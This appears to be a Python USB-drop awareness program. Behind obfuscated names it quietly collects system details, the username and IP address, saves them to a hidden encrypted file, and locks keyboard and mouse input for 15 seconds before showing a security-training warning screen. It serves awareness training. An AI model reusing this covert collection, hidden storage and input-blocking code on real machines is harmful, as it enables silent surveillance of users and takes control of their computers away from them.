# Security Assessment Tool - Obfuscated Version
import tkinter as tk
import subprocess
import platform
import os
import socket
import getpass
from datetime import datetime
try:
    from cryptography.fernet import Fernet
except Exception:
    Fernet = None
import base64
import threading
import time
import math
import json
import ctypes
from ctypes import wintypes

class ImprovedInputBlocker:
    def __init__(self, parent_window):
        self.parent_window = parent_window
        self.blocking_active = False
        
    def start_input_blocking(self, duration=15):
        """Start input blocking for specified duration (seconds)"""
        if self.blocking_active:
            return
            
        self.blocking_active = True
        
        if platform.system().lower() == 'windows':
            success = self._block_windows_input()
            if not success:
                self._block_cross_platform_input()
        else:
            self._block_cross_platform_input()
        
        # Schedule unblocking
        self.parent_window.after(duration * 1000, self.stop_input_blocking)
    
    def _block_windows_input(self):
        """Windows-specific input blocking using BlockInput API"""
        try:
            # Use the simple and effective BlockInput API
            # This requires administrator privileges but works reliably
            result = ctypes.windll.user32.BlockInput(True)
            if result:
                return True
            else:
                # If BlockInput fails (no admin rights), try alternative method
                return self._block_windows_input_alternative()
                
        except Exception as e:
            # Fallback to alternative method
            return self._block_windows_input_alternative()
    
    def _block_windows_input_alternative(self):
        """Alternative Windows input blocking using hooks"""
        try:
            # Load Windows DLLs
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            
            # Hook constants
            WH_KEYBOARD_LL = 13
            WH_MOUSE_LL = 14
            
            # Hook procedure type
            HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
            
            # Keyboard hook procedure - block all except Ctrl+Alt+Del
            def keyboard_proc(nCode, wParam, lParam):
                if nCode >= 0 and self.blocking_active:
                    # Get virtual key code
                    vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value
                    
                    # Allow Ctrl+Alt+Del (can't be blocked anyway)
                    if not (user32.GetKeyState(0x11) & 0x8000 and  # Ctrl
                           user32.GetKeyState(0x12) & 0x8000 and   # Alt
                           vk_code == 0x2E):  # Del
                        return 1  # Block the input
                
                return user32.CallNextHookEx(self.keyboard_hook, nCode, wParam, lParam)
            
            # Mouse hook procedure - block all mouse input
            def mouse_proc(nCode, wParam, lParam):
                if nCode >= 0 and self.blocking_active:
                    return 1  # Block all mouse input
                return user32.CallNextHookEx(self.mouse_hook, nCode, wParam, lParam)
            
            # Create and store hook procedures
            self.keyboard_proc = HOOKPROC(keyboard_proc)
            self.mouse_proc = HOOKPROC(mouse_proc)
            
            # Get module handle
            module_handle = kernel32.GetModuleHandleW(None)
            
            # Install hooks
            self.keyboard_hook = user32.SetWindowsHookExW(
                WH_KEYBOARD_LL, self.keyboard_proc, module_handle, 0)
            self.mouse_hook = user32.SetWindowsHookExW(
                WH_MOUSE_LL, self.mouse_proc, module_handle, 0)
            
            if self.keyboard_hook and self.mouse_hook:
                return True
            else:
                self._cleanup_windows_hooks()
                return False
                
        except Exception as e:
            self._cleanup_windows_hooks()
            return False
    
    def _block_cross_platform_input(self):
        """Cross-platform input blocking using window grab"""
        try:
            # Make window modal and grab focus
            self.parent_window.attributes('-topmost', True)
            self.parent_window.grab_set()
            self.parent_window.focus_force()
            
            # Bind all key events to do nothing
            self.parent_window.bind('<Key>', lambda e: "break")
            self.parent_window.bind('<Button-1>', lambda e: "break")
            self.parent_window.bind('<Button-2>', lambda e: "break")
            self.parent_window.bind('<Button-3>', lambda e: "break")
            
        except Exception as e:
            pass
    
    def stop_input_blocking(self):
        """Stop input blocking and restore normal operation"""
        if not self.blocking_active:
            return
            
        self.blocking_active = False
        
        if platform.system().lower() == 'windows':
            self._cleanup_windows_input()
        
        self._restore_cross_platform_input()
    
    def _cleanup_windows_input(self):
        """Clean up Windows input blocking"""
        try:
            # Try to unblock using BlockInput first
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        
        try:
            # Clean up hooks if they were used
            if hasattr(self, 'keyboard_hook') and self.keyboard_hook:
                ctypes.windll.user32.UnhookWindowsHookEx(self.keyboard_hook)
                self.keyboard_hook = None
            
            if hasattr(self, 'mouse_hook') and self.mouse_hook:
                ctypes.windll.user32.UnhookWindowsHookEx(self.mouse_hook)
                self.mouse_hook = None
        except:
            pass
    
    def _restore_cross_platform_input(self):
        """Restore cross-platform input"""
        try:
            # Restore window properties
            self.parent_window.attributes('-topmost', False)
            self.parent_window.grab_release()
            
            # Unbind event handlers
            self.parent_window.unbind('<Key>')
            self.parent_window.unbind('<Button-1>')
            self.parent_window.unbind('<Button-2>')
            self.parent_window.unbind('<Button-3>')
            
        except Exception as e:
            pass

# Obfuscated variable names and functions
class XvKjP9mNqR:
    def __init__(self):
        self.__wMnPqRtY = tk.Tk()
        self.__aLkJhGfD = "Security Assessment"
        self.__zXcVbNmQ = "900x700"
        self.__qWeRtYuI = False
        self.__pOiUyTrE = '#0a0a0a'
        
        # Obfuscated encryption key (base64 encoded)
        self.__kEyEnCrYpT = b'ZmRhdGFfZW5jcnlwdGlvbl9rZXlfZm9yX3NlY3VyaXR5X3Rlc3RfMjAyNA=='
        
        # Initialize improved input blocker
        self.__iNpUt_BlOcKeR = ImprovedInputBlocker(self.__wMnPqRtY)
        
        self.__setup_wInDoW()
        self.__gLoW_aLpHa = 0
        self.__gLoW_dIrEcTiOn = 1
        self.__pUlSe_OfFsEt = 0
        
        self.__cReAtE_gUi()
        self.__cOlLeCt_SyStEm_InFo()
        self.__sTaRt_AnImAtIoNs()
    
    def __setup_wInDoW(self):
        self.__wMnPqRtY.title(self.__aLkJhGfD)
        self.__wMnPqRtY.geometry(self.__zXcVbNmQ)
        self.__wMnPqRtY.resizable(self.__qWeRtYuI, self.__qWeRtYuI)
        self.__wMnPqRtY.configure(bg=self.__pOiUyTrE)
        self.__cEnTeR_wInDoW()
    
    def __cEnTeR_wInDoW(self):
        self.__wMnPqRtY.update_idletasks()
        x = (self.__wMnPqRtY.winfo_screenwidth() // 2) - (900 // 2)
        y = (self.__wMnPqRtY.winfo_screenheight() // 2) - (700 // 2)
        self.__wMnPqRtY.geometry(f"900x700+{x}+{y}")
    
    def __gEnErAtE_kEy(self):
        """Generate encryption key from obfuscated base"""
        base_key = base64.b64decode(self.__kEyEnCrYpT).decode()
        # Create a 32-byte key for Fernet
        key = base64.urlsafe_b64encode(base_key[:32].ljust(32, '0').encode())
        return key
    
    def __cOlLeCt_SyStEm_InFo(self):
        """Collect system information for security tracking"""
        try:
            # Get system information using multiple methods
            sys_info = {}
            
            # Basic system info
            sys_info['timestamp'] = datetime.now().isoformat()
            sys_info['platform'] = platform.platform()
            sys_info['machine'] = platform.machine()
            sys_info['processor'] = platform.processor()
            sys_info['username'] = getpass.getuser()
            
            try:
                sys_info['hostname'] = socket.gethostname()
                sys_info['ip_address'] = socket.gethostbyname(socket.gethostname())
            except:
                sys_info['hostname'] = 'unknown'
                sys_info['ip_address'] = 'unknown'
            
            # Get detailed system info via systeminfo command
            try:
                if platform.system().lower() == 'windows':
                    result = subprocess.run(['systeminfo'], capture_output=True, text=True, timeout=30)
                    sys_info['detailed_info'] = result.stdout
                else:
                    # For non-Windows systems
                    result = subprocess.run(['uname', '-a'], capture_output=True, text=True, timeout=10)
                    sys_info['detailed_info'] = result.stdout
            except:
                sys_info['detailed_info'] = 'Unable to collect detailed system information'
            
            # Get environment variables (selected ones)
            env_vars = ['COMPUTERNAME', 'USERNAME', 'USERDOMAIN', 'OS', 'PROCESSOR_ARCHITECTURE']
            sys_info['env_vars'] = {var: os.environ.get(var, 'N/A') for var in env_vars}
            
            # Store encrypted data
            self.__sToRe_EnCrYpTeD_dAtA(sys_info)
            
        except Exception as e:
            # Silently handle errors - don't alert user
            pass
    
    def __sToRe_EnCrYpTeD_dAtA(self, data):
        """Store encrypted system information"""
        try:
            # Skip if optional cryptography is unavailable
            if Fernet is None:
                return
            # Generate encryption key
            key = self.__gEnErAtE_kEy()
            fernet = Fernet(key)
            
            # Convert data to JSON and encrypt
            json_data = json.dumps(data, indent=2)
            encrypted_data = fernet.encrypt(json_data.encode())
            
            # Obfuscated filename (stored in current working directory)
            filename = '.sys_' + base64.b64encode(b'security_assessment').decode()[:8] + '.dat'
            file_path = os.path.join(os.getcwd(), filename)

            with open(file_path, 'wb') as f:
                f.write(encrypted_data)

            # Make file hidden and read-only on Windows
            if platform.system().lower() == 'windows':
                try:
                    subprocess.run(['attrib', '+h', '+r', file_path], capture_output=True, timeout=5)
                except:
                    pass
                    
        except Exception as e:
            # Silently handle errors
            pass
    
    def __cReAtE_gUi(self):
        # Main container with neon border effect
        self.__mAiN_fRaMe = tk.Frame(self.__wMnPqRtY, bg='#0a0a0a', 
                                    highlightbackground='#00ffff', 
                                    highlightthickness=2, relief='solid')
        self.__mAiN_fRaMe.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Animated header
        self.__hEaDeR_fRaMe = tk.Frame(self.__mAiN_fRaMe, bg='#0a0a0a', height=120)
        self.__hEaDeR_fRaMe.pack(fill='x', pady=10)
        self.__hEaDeR_fRaMe.pack_propagate(False)
        
        # Failure message with neon glow effect
        self.__fAiLuRe_LaBel = tk.Label(self.__hEaDeR_fRaMe, 
                                       text="⚠️ SECURITY ASSESSMENT FAILED ⚠️",
                                       font=('Orbitron', 28, 'bold'),
                                       fg='#ff0080',
                                       bg='#0a0a0a')
        self.__fAiLuRe_LaBel.pack(pady=(15, 5))
        
                        # Subtitle
        self.__sUbTiTlE_lAbEl = tk.Label(self.__hEaDeR_fRaMe,
                                         text="USB Drop Attack Simulation - Educational Purpose",
                                         font=('Consolas', 16),
                                         fg='#00ffff',
                                         bg='#0a0a0a')
        self.__sUbTiTlE_lAbEl.pack(pady=(5, 10))
        
        # Bottom section with signature (pack early to reserve space)
        self.__bOtToM_fRaMe = tk.Frame(self.__mAiN_fRaMe, bg='#0a0a0a', height=100)
        self.__bOtToM_fRaMe.pack(fill='x', side='bottom', pady=(15, 10))
        self.__bOtToM_fRaMe.pack_propagate(False)
        
        self.__sIgNaTuRe_LaBel = tk.Label(self.__bOtToM_fRaMe,
                                           text="By Cybersecurity Team Alignex",
                                           font=('Orbitron', 14, 'bold'),
                                           fg='#00ffff',
                                           bg='#0a0a0a')
        self.__sIgNaTuRe_LaBel.pack(side='bottom', pady=(0, 10))
        
        self.__cLoSe_BuTtOn = tk.Button(self.__bOtToM_fRaMe,
                                         text="ACKNOWLEDGE & CLOSE",
                                         font=('Orbitron', 14, 'bold'),
                                         fg='#000000',
                                         bg='#00ff00',
                                         activeforeground='#000000',
                                         activebackground='#00ffff',
                                         relief='flat',
                                         width=25,
                                         command=self.__cLoSe_ApPlIcAtIoN)
        self.__cLoSe_BuTtOn.pack(pady=(10, 0))
        
        # Content area with neon border
        self.__cOnTeNt_FrAmE = tk.Frame(self.__mAiN_fRaMe, bg='#1a1a1a', 
                                       highlightbackground='#ff0080', 
                                       highlightthickness=1, relief='solid')
        self.__cOnTeNt_FrAmE.pack(fill='both', expand=True, padx=16, pady=(6, 10))
        
        # What happened section
        self.__wHaT_hApPeNeD_lAbEl = tk.Label(self.__cOnTeNt_FrAmE,
                                             text="WHAT JUST HAPPENED?",
                                             font=('Orbitron', 16, 'bold'),
                                             fg='#00ff00',
                                             bg='#1a1a1a')
        self.__wHaT_hApPeNeD_lAbEl.pack(pady=(15, 8))
        
        # Explanation text
        explanation_text = (
            "You have just executed an unknown program from an untrusted USB device.\n\n"
            "In a real-world scenario, this action could have resulted in:\n\n"
            "🔴 MALWARE INSTALLATION\n"
            "   • Ransomware encrypting all your files\n"
            "   • Keyloggers capturing passwords and sensitive data\n"
            "   • Remote access trojans giving attackers full control\n\n"
            "🔴 DATA BREACH\n"
            "   • Corporate secrets stolen and sold\n"
            "   • Customer information compromised\n"
            "   • Financial records accessed by criminals\n\n"
            "🔴 NETWORK COMPROMISE\n"
            "   • Lateral movement to other systems\n"
            "   • Company-wide infrastructure infiltration\n"
            "   • Business operations completely disrupted\n\n"
            "This incident has been logged for security analysis purposes."
        )
        
        # Create a frame for text widget and scrollbar
        text_frame = tk.Frame(self.__cOnTeNt_FrAmE, bg='#2a2a2a')
        text_frame.pack(fill='both', expand=True, padx=12, pady=8)
        
        self.__eXpLaNaTiOn_TeXt = tk.Text(text_frame, 
                                         font=('Consolas', 10),
                                         fg='#ffffff',
                                         bg='#2a2a2a',
                                         insertbackground='#00ffff',
                                         selectbackground='#ff0080',
                                         relief='flat',
                                         wrap='word',
                                         height=12)
        
        # Add scrollbar
        scrollbar = tk.Scrollbar(text_frame, orient='vertical', command=self.__eXpLaNaTiOn_TeXt.yview)
        self.__eXpLaNaTiOn_TeXt.configure(yscrollcommand=scrollbar.set)
        
        # Pack text widget and scrollbar
        self.__eXpLaNaTiOn_TeXt.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        self.__eXpLaNaTiOn_TeXt.insert('1.0', explanation_text)
        self.__eXpLaNaTiOn_TeXt.config(state='disabled')
        
        # Security tips section
        self.__tIpS_lAbEl = tk.Label(self.__cOnTeNt_FrAmE,
                                    text="🛡️ SECURITY BEST PRACTICES",
                                    font=('Orbitron', 14, 'bold'),
                                    fg='#00ff00',
                                    bg='#1a1a1a')
        self.__tIpS_lAbEl.pack()
        
        tips_text = (
            "✓ NEVER plug in unknown USB devices\n"
            "✓ Always scan external media with updated antivirus\n"
            "✓ Verify suspicious files with IT Security team\n"
            "✓ Report found USB devices to security personnel\n"
            "✓ Keep your system and software updated\n"
            "✓ Enable real-time protection and firewalls"
        )
        
        self.__tIpS_tExT = tk.Label(self.__cOnTeNt_FrAmE,
                                   text=tips_text,
                                   font=('Consolas', 10),
                                   fg='#00ffff',
                                   bg='#1a1a1a',
                                   justify='left')
        self.__tIpS_tExT.pack(pady=(5, 10))
        
        # Ensure layout reserves space above the bottom frame (no-op if unsupported)
        try:
            self.__cOnTeNt_FrAmE.pack_configure(before=self.__bOtToM_fRaMe)
        except Exception:
            pass
        
        # Add decorative elements
        self.__aDd_DeCoRaTiVe_ElEmEnTs()
    
    def __aDd_DeCoRaTiVe_ElEmEnTs(self):
        corners = ['┌', '┐', '└', '┘']
        positions = [(20, 20), (860, 20), (20, 650), (860, 650)]
        
        for corner, pos in zip(corners, positions):
            corner_label = tk.Label(self.__wMnPqRtY, text=corner, 
                                   font=('Consolas', 16, 'bold'),
                                   fg='#ff0080', bg='#0a0a0a')
            corner_label.place(x=pos[0], y=pos[1])
    
    def __aNiMaTe_GlOw(self):
        try:
            self.__gLoW_aLpHa += self.__gLoW_dIrEcTiOn * 0.05
            if self.__gLoW_aLpHa >= 1:
                self.__gLoW_dIrEcTiOn = -1
            elif self.__gLoW_aLpHa <= 0:
                self.__gLoW_dIrEcTiOn = 1
            
            intensity = int(255 * abs(math.sin(self.__pUlSe_OfFsEt)))
            self.__pUlSe_OfFsEt += 0.1
            
            glow_color = f"#{intensity:02x}00{255-intensity:02x}"
            self.__fAiLuRe_LaBel.config(fg=glow_color)
            
            border_intensity = int(255 * (0.5 + 0.5 * math.sin(self.__pUlSe_OfFsEt)))
            border_color = f"#{border_intensity:02x}{255-border_intensity:02x}{border_intensity:02x}"
            self.__mAiN_fRaMe.config(highlightbackground=border_color)
            
            self.__wMnPqRtY.after(50, self.__aNiMaTe_GlOw)
        except:
            pass
    
    def __aNiMaTe_SiGnAtUrE(self):
        try:
            colors = ['#00ffff', '#00aaff', '#0088ff', '#00aaff']
            current_time = int(time.time() * 2) % len(colors)
            self.__sIgNaTuRe_LaBel.config(fg=colors[current_time])
            
            self.__wMnPqRtY.after(500, self.__aNiMaTe_SiGnAtUrE)
        except:
            pass
    

    
    def __sTaRt_AnImAtIoNs(self):
        self.__aNiMaTe_GlOw()
        self.__aNiMaTe_SiGnAtUrE()
    
    def __cLoSe_ApPlIcAtIoN(self):
        # Stop input blocking before closing
        self.__iNpUt_BlOcKeR.stop_input_blocking()
        
        def fade_out():
            try:
                alpha = self.__wMnPqRtY.attributes('-alpha')
                if alpha > 0:
                    self.__wMnPqRtY.attributes('-alpha', alpha - 0.1)
                    self.__wMnPqRtY.after(50, fade_out)
                else:
                    self.__wMnPqRtY.destroy()
            except:
                self.__wMnPqRtY.destroy()
        
        try:
            self.__wMnPqRtY.attributes('-alpha', 1.0)
        except:
            pass
        
        fade_out()
    
    def rUn_ApPlIcAtIoN(self):
        try:
            self.__wMnPqRtY.attributes('-alpha', 0.98)
        except:
            pass
        
        self.__wMnPqRtY.attributes('-topmost', True)
        self.__wMnPqRtY.after(3000, lambda: self.__wMnPqRtY.attributes('-topmost', False))
        
        # Start improved input blocking after a short delay
        self.__wMnPqRtY.after(500, lambda: self.__iNpUt_BlOcKeR.start_input_blocking(15))
        
        self.__wMnPqRtY.mainloop()

# Obfuscated main execution
if __name__ == "__main__":
    # Additional obfuscation layers
    exec("".join([chr(ord(c) ^ 0) for c in "app = XvKjP9mNqR()"]))
    exec("".join([chr(ord(c) ^ 0) for c in "app.rUn_ApPlIcAtIoN()"]))
